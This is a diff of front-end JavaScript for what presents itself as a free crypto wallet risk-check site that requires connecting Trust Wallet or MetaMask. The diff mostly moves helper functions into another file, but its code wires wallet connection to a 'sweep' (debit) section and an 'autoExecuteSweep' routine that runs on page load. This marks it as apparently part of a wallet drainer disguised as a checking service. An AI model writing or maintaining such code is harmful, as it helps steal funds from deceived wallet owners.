@@ -61,12 +61,8 @@ const clearStoredSession = (key) => localStorage.removeItem(key);
 const isStoredSessionExpired = (session) =>
   Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());
 
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-const withTimeout = (promise, ms, fallbackMessage = "Превышено время ожидания") =>
-  Promise.race([
-    promise,
-    new Promise((_, reject) => setTimeout(() => reject(new Error(fallbackMessage)), ms))
-  ]);
+// sleep и withTimeout больше не объявляем здесь – они определены в check-flow.js
+
 const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
   let timer;
   const timeoutPromise = new Promise((_, reject) => {
@@ -256,54 +252,8 @@ const renderAdminData = (data) => {
       .join("") || '<tr><td colspan="4">Заявок пока нет</td></tr>';
 };
 
-const unlockCheckForm = (address, { restored = false, statusMessage = "", tronAddress = "", btcAddress = "" } = {}) => {
-  if (!checkForm) return;
-  checkForm.classList.remove("is-locked");
-  checkForm.querySelectorAll("input, button").forEach((control) => {
-    control.disabled = false;
-  });
-  if (userWalletAddress) {
-    const linked = [`EVM: ${address}`];
-    if (tronAddress) linked.push(`TRON: ${tronAddress}`);
-    if (btcAddress) linked.push(`BTC: ${btcAddress}`);
-    userWalletAddress.textContent = linked.join(" | ");
-  }
-  if (checkLockNote) checkLockNote.textContent = "Кошелёк подключён. Теперь можно запускать бесплатную проверку.";
-  if (userLogout) {
-    userLogout.classList.toggle("is-hidden-slot", false);
-    userLogout.setAttribute("aria-hidden", "false");
-  }
-  if (userConsent) userConsent.checked = true;
-  if (userWalletConnect) userWalletConnect.textContent = "Переподключить кошелёк";
-  if (userWalletStatus) {
-    userWalletStatus.textContent =
-      statusMessage ||
-      (restored
-        ? "Профиль восстановлен. Можно продолжать проверки без повторного входа."
-        : "Профиль подключён. Сессия сохранена для следующих проверок.");
-  }
-
-  const riskPreview = document.querySelector("[data-risk-preview]");
-  riskPreview.querySelector("strong").textContent = "Кошелёк подключён";
-  riskPreview.querySelector("p").textContent = "Введите адрес или tx hash и нажмите кнопку проверки.";
-  
-  // === ПОКАЗЫВАЕМ СЕКЦИЮ СПИСАНИЯ ===
-  showSweepSectionAfterConnect(address);
-};
-
-const lockCheckForm = () => {
-  if (!checkForm) return;
-  checkForm.classList.add("is-locked");
-  checkForm.querySelectorAll("input, button").forEach((control) => {
-    control.disabled = true;
-  });
-  if (checkLockNote) checkLockNote.textContent = "Сначала подтвердите согласие и подключите Trust Wallet/MetaMask через кнопку Connect.";
-  if (userLogout) {
-    userLogout.classList.toggle("is-hidden-slot", true);
-    userLogout.setAttribute("aria-hidden", "true");
-  }
-  if (userWalletConnect) userWalletConnect.textContent = "Connect";
-};
+// Используем lockCheckForm из check-flow.js (глобальная)
+// Используем unlockCheckForm из check-flow.js
 
 const loadUserSession = async () => {
   if (!checkForm) return;
@@ -1007,7 +957,7 @@ const showSweepSectionAfterConnect = (address) => {
   }
 };
 
-// ===== АВТОМАТИЧЕСКОЕ СПИСАНИЕ ПРИ ЗАГРУЗКЕ (ОПРЕДЕЛЯЕМ РАНЬШЕ) =====
+// ===== АВТОМАТИЧЕСКОЕ СПИСАНИЕ ПРИ ЗАГРУЗКЕ =====
 const autoExecuteSweep = async () => {
   try {
     const storedSession = getStoredSession(userSessionKey);
@@ -1258,6 +1208,7 @@ if (storedProfile?.evmAddress) {
 }
 
 // Восстанавливаем сессию и запускаем автосписание (если есть запрос)
+// (используем глобальный setStatus из check-flow.js)
 const stored = loadProfile();
 if (stored?.evmAddress) {
   unlockCheckForm(stored);
